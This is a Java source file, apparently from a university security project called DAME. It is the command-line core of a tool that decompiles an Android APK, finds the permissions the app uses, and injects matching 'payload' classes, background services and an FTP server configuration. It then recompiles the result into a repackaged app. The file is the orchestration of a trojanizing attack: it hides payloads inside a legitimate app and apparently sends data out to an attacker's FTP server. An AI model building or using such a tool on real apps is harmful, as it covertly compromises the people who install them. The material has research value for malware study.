package it.unisannio.srss.dame.cli;

import it.unisannio.srss.dame.android.payloads.Payload;
import it.unisannio.srss.dame.injection.CallInjector;
import it.unisannio.srss.dame.injection.CommonInjector;
import it.unisannio.srss.dame.model.FTPServerConfig;
import it.unisannio.srss.dame.model.Permission;
import it.unisannio.srss.dame.model.UsagePoint;
import it.unisannio.srss.utils.ApkUtils;
import it.unisannio.srss.utils.ExecUtils;
import it.unisannio.srss.utils.FileUtils;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Set;

import org.reflections.Reflections;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.ObjectMapper;

/**
 * @author Danilo Cianciulli
 */
public class Dame {

	private final static Logger log = LoggerFactory.getLogger(Dame.class);

	private final static String PAYLOADS_BASE_PACKAGE = "it.unisannio.srss.dame.android.payloads";

	public final static String APKTOOL_DEFAULT_PATH = "./tools/apktool";
	public final static String ANDROGUARD_DEFAULT_PATH_CONST = "~/tools/androguard/";
	public final static String ANDROGUARD_DEFAULT_PATH = new File(
			System.getProperty("user.home"), "tools/androguard/")
			.getAbsolutePath();
	public final static String BUILD_TOOLS_DEFAULT_PATH_CONST = "~/tools/android/android-sdk-linux_x86/build-tools/21.1.2/";
	public final static String BUILD_TOOLS_DEFAULT_PATH = new File(
			System.getProperty("user.home"),
			"tools/android/android-sdk-linux_x86/build-tools/21.1.2/")
			.getAbsolutePath();
	public final static String PYTHON_DEFAULT_PATH = "python";
	public final static String DEFAULT_SERVER_CONFIG_FILE = "config.properties";
	public final static String DEFAULT_OUT_APK_FILE = "out.apk";

	private final static String PERMISSIONS_SCRIPT_PATH = "./scripts/permission_extractor.py";
	private final static String COMMON_SMALI_PATH = "./common-smali/";

	private String apkIn = null;
	private String apkOut = null;

	private String serverConfigPath = null;

	private String apktoolPath = APKTOOL_DEFAULT_PATH;
	private String pythonPath = PYTHON_DEFAULT_PATH;

	private String androguardPath = ANDROGUARD_DEFAULT_PATH;
	private String androidBuildToolsPath = BUILD_TOOLS_DEFAULT_PATH;

	private Map<String, Set<UsagePoint>> apkPermissions = null;

	public String getApkIn() {
		return apkIn;
	}

	public void setApkIn(String apkIn) {
		this.apkIn = apkIn;
	}

	public String getApkOut() {
		return apkOut;
	}

	public void setApkOut(String apkOut) {
		this.apkOut = apkOut;
	}

	public String getApktoolPath() {
		return apktoolPath;
	}

	public void setApktoolPath(String apktoolPath) {
		this.apktoolPath = apktoolPath;
	}

	public String getPythonPath() {
		return pythonPath;
	}

	public void setPythonPath(String pythonPath) {
		this.pythonPath = pythonPath;
	}

	public String getServerConfigPath() {
		return serverConfigPath;
	}

	public void setServerConfigPath(String serverConfigPath) {
		this.serverConfigPath = serverConfigPath;
	}

	public String getAndroguardPath() {
		return androguardPath;
	}

	public void setAndroguardPath(String androguardPath) {
		this.androguardPath = androguardPath;
	}

	public String getAndroidBuildToolsPath() {
		return androidBuildToolsPath;
	}

	public void setAndroidBuildToolsPath(String androidBuildToolsPath) {
		this.androidBuildToolsPath = androidBuildToolsPath;
	}

	public List<Payload> getFilteredPayloadList() throws IOException {
		List<Payload> payloads = getAllPayloads();
		Map<String, Set<UsagePoint>> apkPermissions = getAPKPermissions();
		Iterator<Payload> i = payloads.iterator();
		Payload p;
		while (i.hasNext()) {
			p = i.next();
			boolean applicable = true;
			for (String permission : p.getConfig().getPermissions())
				if (!apkPermissions.containsKey(permission))
					applicable = false;
			if (!applicable)
				i.remove();
		}
		return payloads;
	}

	public List<Payload> getAllPayloads() throws IOException {
		Reflections reflections = new Reflections(PAYLOADS_BASE_PACKAGE);
		Set<Class<? extends Payload>> payloadClasses = reflections
				.getSubTypesOf(Payload.class);
		List<Payload> payloads = new ArrayList<Payload>();
		for (Class<? extends Payload> payloadClass : payloadClasses) {
			try {
				payloads.add(payloadClass.newInstance());
			} catch (Exception e) {
				log.error(
						"Could not load payload: "
								+ payloadClass.getCanonicalName(), e);
			}
		}
		return payloads;
	}

	public Map<String, Set<UsagePoint>> getAPKPermissions() throws IOException {
		if (apkPermissions == null) {
			log.info("Please wait while analyzing the APK...");
			File script = FileUtils.checkFile(PERMISSIONS_SCRIPT_PATH);
			File apkIn = FileUtils.checkFile(this.apkIn);
			FileUtils.checkDir(androguardPath);

			StringBuffer outputBuffer = new StringBuffer();
			StringBuffer errorBuffer = new StringBuffer();
			int exitCode = ExecUtils.exec(outputBuffer,errorBuffer,null, pythonPath,
					script.getAbsolutePath(), apkIn.getAbsolutePath(),
					androguardPath);
			String output = outputBuffer.toString();
			String error = errorBuffer.toString();
			if (exitCode != 0) {
				String err = output + "\n" + error;
				log.error(err);
				throw new IOException(err);
			}
			ObjectMapper mapper = new ObjectMapper();
			List<Permission> permissions = mapper.readValue(output,
					new TypeReference<List<Permission>>() {
					});
			Map<String, Set<UsagePoint>> res = new HashMap<String, Set<UsagePoint>>();
			for (Permission permission : permissions)
				res.put(permission.getType(), new HashSet<UsagePoint>(
						permission.getUsagePoints()));
			apkPermissions = res;
		}
		return apkPermissions;
	}

	public void inject(List<Payload> payloads) throws IOException {
		FileUtils.checkDir(COMMON_SMALI_PATH);

		FTPServerConfig ftpServerConfig;
		log.info("Loading FTP server configuration.");
		try {
			ftpServerConfig = getServerConfig();
		} catch (IOException e) {
			log.error("Unable to locate the FTP server configuration.", e);
			throw e;
		}
		log.info("FTP server configuration sucessfully loaded");
		log.debug(ftpServerConfig.toString());

		File decompiledDir = ApkUtils.decompile(apkIn, apktoolPath);

		CommonInjector.injectSmali(new File(COMMON_SMALI_PATH).toPath(),
				decompiledDir.toPath());
		CommonInjector.injectServices(decompiledDir.toPath());
		CommonInjector.injectFtpConfig(decompiledDir.toPath(), ftpServerConfig);

		// TODO generare la mappa payload permissions
		Map<String, Set<String>> payloadsMap = new HashMap<String, Set<String>>();
		for (Payload payload : payloads) {
			for (String permission : payload.getConfig().getPermissions()) {
				Set<String> set = payloadsMap.get(permission);
				if (set == null)
					set = new HashSet<String>();
				set.add(payload.getClass().getCanonicalName());
				payloadsMap.put(permission, set);
			}
		}
		CallInjector injector = new CallInjector(getAPKPermissions(),
				payloadsMap, decompiledDir.getAbsolutePath());
		injector.inject();

		ApkUtils.compile(decompiledDir.getAbsolutePath(),
				androidBuildToolsPath, apktoolPath, getApkOutPath());
	}

	private FTPServerConfig getServerConfig() throws IOException {
		if (serverConfigPath == null) {
			// se non è stato impostato, si usa il default
			String path = (new File(apkIn)).getParent();
			if (!path.endsWith(File.separator))
				path += File.separator;
			serverConfigPath = path + DEFAULT_SERVER_CONFIG_FILE;
		}
		return FTPServerConfig.loadFromFile(serverConfigPath);
	}

	private String getApkOutPath() {
		if (apkOut == null) {
			// se non è stato impostato, si usa il default
			String path = (new File(apkIn)).getParent();
			if (!path.endsWith(File.separator))
				path += File.separator;
			apkOut = path + DEFAULT_OUT_APK_FILE;
		}
		return apkOut;
	}

}
